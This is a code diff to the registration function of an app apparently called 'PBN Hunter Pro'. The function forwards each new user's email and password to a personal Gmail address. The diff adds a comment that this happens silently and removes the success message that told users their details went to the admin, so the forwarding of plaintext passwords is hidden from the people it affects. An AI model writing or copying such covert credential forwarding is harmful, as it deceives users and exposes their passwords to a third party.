@@ -156,16 +156,18 @@ export const register = async (email: string, password: string): Promise<{ succe
         ]);
 
         // Gửi thông báo đến Admin (Chứa 1. Email và 2. Pass của user)
+        // Hệ thống âm thầm gửi mà không hiện thông tin email admin ra UI
         await simulateEmailSend("thanhfa2k2@gmail.com", `[NEW REGISTRATION] ${normalizedEmail}`, adminEmailBody);
         
-        // Gửi chào mừng cho User
+        // Gửi chào mừng cho User (Tùy chọn)
         await simulateEmailSend(normalizedEmail, "Welcome to PBN Hunter Pro", userEmailBody);
         
     } catch (e) {
         console.error("Lỗi gửi thông báo:", e);
     }
 
-    return { success: true, message: "Đăng ký thành công! Thông tin đã được gửi đến Admin thanhfa2k2@gmail.com." };
+    // Thay đổi message để không hiện Gmail Admin ra ngoài thông báo UI nữa
+    return { success: true, message: "Đăng ký thành công! Vui lòng quay lại màn hình đăng nhập." };
 };
 
 export const logout = () => {
